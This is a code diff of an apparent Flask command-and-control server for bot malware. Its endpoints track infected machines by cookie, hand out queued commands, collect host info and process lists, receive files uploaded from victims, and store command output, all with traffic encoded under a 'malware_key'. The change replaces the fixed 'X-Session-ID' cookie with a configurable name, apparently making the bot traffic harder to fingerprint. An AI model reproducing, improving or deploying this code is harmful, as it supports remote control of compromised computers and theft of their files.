@@ -25,7 +25,7 @@ def heartbeat():
     Beacon heartbeat endpoint
     Used by the bot to check in and get additional commands
     If there are no commands to execute, returns {"action":"ok"} which is an Ok/NOP
-    Uses X-Session-ID cookie as a bot UUID
+    Uses app.config['COOKIE_NAME'] cookie as a bot UUID
 
     :return: command for bot to execute
     """
@@ -33,8 +33,8 @@ def heartbeat():
         conn = get_db()
         checkin = int(time.time())
 
-        # if request has no cookie, assume this is a new bot and issue it a new X-Session-ID cookie (UUID)
-        if 'X-Session-ID' not in request.cookies:
+        # if request has no cookie, assume this is a new bot and issue it a new app.config['COOKIE_NAME'] cookie (UUID)
+        if app.config['COOKIE_NAME'] not in request.cookies:
             print("New checkin at " + str(checkin))
             response_json = {}
             if app.info_on_first_checkin:
@@ -44,11 +44,11 @@ def heartbeat():
             resp = flask.Response(mal_encode(app.malware_key, json.dumps(response_json)))
             bot_id = uuid.uuid1()
             print("Adding new UUID to db:" + str(bot_id))
-            resp.set_cookie("X-Session-ID", str(bot_id), expires=datetime.datetime.now() + datetime.timedelta(days=30))
+            resp.set_cookie(app.config['COOKIE_NAME'], str(bot_id), expires=datetime.datetime.now() + datetime.timedelta(days=30))
             db.add_bot_to_db(conn, str(bot_id), checkin)
             return resp
         else:
-            id = request.cookies['X-Session-ID']
+            id = request.cookies[app.config['COOKIE_NAME']]
             db.add_bot_to_db(conn, id, checkin) # just in case bot isn't in DB (old bot reconnecting)
             db.checkin(conn, id)
             command = dbget.pop_bot_queuedcommand(conn, id)
@@ -79,11 +79,11 @@ def info():
     :return:
     """
     if request.method == 'POST':
-        if 'X-Session-ID' not in request.cookies:
+        if app.config['COOKIE_NAME'] not in request.cookies:
             print('No cookie found - cannot update info')
             return mal_encode(app.malware_key, "Error: no cookie")
         else:
-            id = request.cookies['X-Session-ID']
+            id = request.cookies[app.config['COOKIE_NAME']]
             d = mal_decode(app.malware_key, request.data)
             conn = get_db()
 
@@ -107,13 +107,13 @@ def ps():
     :return:
     """
     if request.method == 'POST':
-        if 'X-Session-ID' not in request.cookies:
+        if app.config['COOKIE_NAME'] not in request.cookies:
             print('No cookie found - cannot update info')
             return mal_encode(app.malware_key, "Error: no cookie")
         else:
             conn = get_db()
             proc_string = mal_decode(app.malware_key, request.data)
-            db.update_proclist(conn, request.cookies['X-Session-ID'], proc_string)
+            db.update_proclist(conn, request.cookies[app.config['COOKIE_NAME']], proc_string)
             return mal_encode(app.malware_key, "Successfully updated process list")
 
 
@@ -127,7 +127,7 @@ def upload():
     """
     if request.method == 'POST':
         # check if the post request has the file part
-        if 'file' not in request.files or 'X-Session-ID' not in request.cookies:
+        if 'file' not in request.files or app.config['COOKIE_NAME'] not in request.cookies:
             print("No file detected")
             return mal_encode(app.malware_key, "Error with file upload")
 
@@ -139,7 +139,7 @@ def upload():
         print(file.filename)
         if file:
             filename = secure_filename(str(int(time.time())) + "_" + file.filename)
-            cookiename = secure_filename(request.cookies['X-Session-ID'])
+            cookiename = secure_filename(request.cookies[app.config['COOKIE_NAME']])
             dir = app.config['UPLOAD_FOLDER'] + os.sep + cookiename
             if not os.path.exists(dir):
                 os.makedirs(dir)
@@ -157,7 +157,7 @@ def out():
     :return:
     """
     if request.method == 'POST':
-        if 'X-Session-ID' not in request.cookies:
+        if app.config['COOKIE_NAME'] not in request.cookies:
             print('No cookie found - cannot update info')
             return mal_encode(app.malware_key, "Error: no cookie")
         else:
@@ -166,5 +166,5 @@ def out():
             parsed = json.loads(out_string)
             command = parsed["command"]
             output = parsed["output"]
-            db.update_commandout(conn, request.cookies['X-Session-ID'], command, output)
+            db.update_commandout(conn, request.cookies[app.config['COOKIE_NAME']], command, output)
             return mal_encode(app.malware_key, "Output updated successfully")
